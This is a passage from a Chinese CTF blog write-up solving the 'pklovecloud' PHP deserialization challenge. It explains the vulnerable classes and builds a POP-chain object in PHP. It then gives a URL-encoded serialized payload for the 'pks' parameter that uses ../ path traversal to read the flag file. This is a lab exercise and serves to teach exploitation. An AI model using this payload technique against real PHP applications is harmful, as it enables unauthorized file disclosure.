<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">把 flag.php 文件包含进来</font></li>
<li><font style="color:#000000;">定义了一个类 pkshow</font><ul>
<li><font style="color:#000000;">在类中定义了一个函数 echo_name()</font></li>
<li><font style="color:#000000;">返回值为  Pk very safe^.^</font></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;cinder)  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cinder-&gt;<span class="title function_ invoke__">echo_name</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">定义了一个类 acp</font></li>
<li><font style="color:#000000;">类中有 public 成员 neutron 和 nova 以及 protected 成员 cinder</font></li>
<li><font style="color:#000000;">使用魔术方法__construct() ，在对象被创建时调用</font><ul>
<li><font style="color:#000000;">新建立一个对象并赋值给 cinder</font></li>
</ul>
</li>
<li><font style="color:#000000;">使用魔术方法__toString()， 类被当成字符串时的回应方法</font><ul>
<li><font style="color:#000000;">先判断 cinder 是否为随机值，如果是则返回 echo_name 函数的值</font></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="variable language_">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">定义了一个类 ace</font></li>
<li><font style="color:#000000;">公有成员为filename、openstack、docker</font></li>
<li><font style="color:#000000;">定义函数 echo_name()</font><ul>
<li><font style="color:#000000;">对docker 进行反序列化并把值赋值给openstack</font></li>
<li><font style="color:#000000;">把 heat 赋值给 openstack 中的 neutron</font></li>
</ul>
</li>
<li><font style="color:#000000;">判断 openstack 中的 neutron 的值是否与 openstack 中 nova 的值相等</font><ul>
<li><font style="color:#000000;">如果相等则把 filename 的值赋值给 file</font></li>
<li><font style="color:#000000;">判断 file 里是否有内容</font><ul>
<li><font style="color:#000000;">如果有则返回 file 文件的内容</font></li>
<li><font style="color:#000000;">否则返回keystone lost~</font></li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>])  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">这判断 pks 是否是随机值</font></li>
<li><font style="color:#000000;">如果是随机值则把 pks 反序列化的值赋值给 logData 并输出其值</font></li>
<li><font style="color:#000000;">否则显示代码</font></li>
</ul>
<p><font style="color:#000000;">pks 要是我们序列化的代码，</font></p>
<p><font style="color:#000000;">所以构造序列化代码：</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$cinder</span> ; </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123;      </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> ace;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;     </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$docker</span>;        </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">ace</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;docker = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">acp</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">其中要把 flag.php 的内容赋值给 filename 方便以后打开文件，并且 docker 要为空从而使得neutron 与 nova 相等。</font></p>
<p><font style="color:#000000;">输出结果：</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542997735-3053bd85-5855-4a4d-a581-06cf53e79893.png"></p>
<p><font style="color:#000000;">即</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>acp%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>cinder%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>ace%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>flag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>openstack%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>docker%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>neutron%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nova%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">所以传上去看看</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542979421-636612da-89af-4605-b27b-00537eda5aa7.png"></p>
<p><font style="color:#000000;">查看源代码得到这个，提示我们 flag 在 &#x2F;nssctfasdasdflag 这里</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542979379-499e771e-ffa1-4afd-a046-3df242219a14.png"></p>
<p><font style="color:#000000;">所以把 flag.php 改为nssctfasdasdflag 在输出一遍即可</font></p>
<p><font style="color:#000000;">playload:</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pks=O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>acp%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>cinder%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>ace%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A34%<span class="number">3</span>A%<span class="number">22</span>..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>Fnssctfasdasdflag%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>openstack%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>docker%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>pkshow%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>neutron%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nova%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737544347967-bfea4fb9-5bc1-427e-b675-02f08a0abf78.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://fischl0527.github.io">Fischl0527</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://fischl0527.github.io/2025/01/23/2025Win/2025%20Win%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://fischl0527.github.io/2025/01/23/2025Win/2025%20Win%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Training/">Training</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/2025Win%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/01/18/2025Win/2025%20Win%20RCE/" title="2025 Win RCE"><img class="cover" src="/img/cover/2025WinRCE.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">2025 Win RCE</div></div></div></a><a class="pagination-related  no-desc" href="/2025/01/27/2025Win/2025%20Win%20SSTI/" title="2025 Win SSTI"><img class="cover" src="/img/cover/2025WinSSTI.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">2025 Win SSTI</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/08/04/2025CTF/2025%20SWPU-NSSCTF/" title="2025SWPU-NSSCTFwp"><img class="cover" src="/img/cover/2025SWPU-NSSCTFwp.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-04</div><div class="info-item-2">2025SWPU-NSSCTFwp</div></div></div></a><a class="pagination-related no-desc" href="/2025/08/08/BUUWEB/" title="BUUCTFWEB"><img class="cover" src="/img/cover/BUUCTFWEB.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-08</div><div class="info-item-2">BUUCTFWEB</div></div></div></a><a class="pagination-related no-desc" href="/2025/03/21/2025CTF/2025GHCTFwp/" title="2025GHCTFwp"><img class="cover" src="/img/cover/2025GHCTFwp.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-21</div><div class="info-item-2">2025GHCTFwp</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp"><img class="cover" src="/img/cover/2025sqCTF.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">2025sqCTFwp</div></div></div></a><a class="pagination-related no-desc" href="/2024/11/15/HelloWeb/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="BaseCTF2024新生赛复现"><img class="cover" src="/img/cover/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-15</div><div class="info-item-2">BaseCTF2024新生赛复现</div></div></div></a><a class="pagination-related no-desc" href="/2025/01/13/2025Win/2025%20Win%20Homework%200/" title="2025 Win Homework 0"><img class="cover" src="/img/cover/2025WinHomework0.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-13</div><div class="info-item-2">2025 Win Homework 0</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/875E73166434C2B697688F4E9DB5AA6B.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Fischl0527</div><div class="author-info-description">「在哪里去追寻意义。夜色已深，梦还活着。」</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Fischl0527"><i class="fab fa-github"></i><span>Fischl0527</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Fischl0527" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1587607874@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog. I am a CTFer. Welcome everyone!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%AE%B2%E4%B9%89%E5%86%85%E4%BD%9C%E4%B8%9A"><span class="toc-number">1.</span> <span class="toc-text">一、讲义内作业</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%B7%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">二、刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89-HCTF-2018-Warmup"><span class="toc-number">2.1.</span> <span class="toc-text">（一）[HCTF 2018]Warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89-FSCTF-2023-ez-php2"><span class="toc-number">2.2.</span> <span class="toc-text">（二）[FSCTF 2023]ez_php2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">2.3.</span> <span class="toc-text">（三）[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-pklovecloud"><span class="toc-number">2.5.</span> <span class="toc-text">（四）[第五空间 2021]pklovecloud</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/08/08/BUUWEB/" title="BUUCTFWEB"><img src="/img/cover/BUUCTFWEB.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTFWEB"/></a><div class="content"><a class="title" href="/2025/08/08/BUUWEB/" title="BUUCTFWEB">BUUCTFWEB</a><time datetime="2025-08-08T03:45:14.000Z" title="Created 2025-08-08 11:45:14">2025-08-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/04/2025CTF/2025%20SWPU-NSSCTF/" title="2025SWPU-NSSCTFwp"><img src="/img/cover/2025SWPU-NSSCTFwp.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025SWPU-NSSCTFwp"/></a><div class="content"><a class="title" href="/2025/08/04/2025CTF/2025%20SWPU-NSSCTF/" title="2025SWPU-NSSCTFwp">2025SWPU-NSSCTFwp</a><time datetime="2025-08-04T03:45:14.000Z" title="Created 2025-08-04 11:45:14">2025-08-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/" title="2025御网杯wp"><img src="/img/cover/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025御网杯wp"/></a><div class="content"><a class="title" href="/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/" title="2025御网杯wp">2025御网杯wp</a><time datetime="2025-05-11T03:45:14.000Z" title="Created 2025-05-11 11:45:14">2025-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF"><img src="/img/cover/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="十六届蓝桥杯CTF"/></a><div class="content"><a class="title" href="/2025/04/26/2025CTF/%E5%8D%81%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCTFwriteup/" title="十六届蓝桥杯CTF">十六届蓝桥杯CTF</a><time datetime="2025-04-26T03:45:14.000Z" title="Created 2025-04-26 11:45:14">2025-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp"><img src="/img/cover/2025sqCTF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025sqCTFwp"/></a><div class="content"><a class="title" href="/2025/04/04/2025CTF/sqCTFwp/" title="2025sqCTFwp">2025sqCTFwp</a><time datetime="2025-04-04T03:45:14.000Z" title="Created 2025-04-04 11:45:14">2025-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/21/2025CTF/2025GHCTFwp/" title="2025GHCTFwp"><img src="/img/cover/2025GHCTFwp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025GHCTFwp"/></a><div class="content"><a class="title" href="/2025/03/21/2025CTF/2025GHCTFwp/" title="2025GHCTFwp">2025GHCTFwp</a><time datetime="2025-03-21T03:45:14.000Z" title="Created 2025-03-21 11:45:14">2025-03-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Fischl0527</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>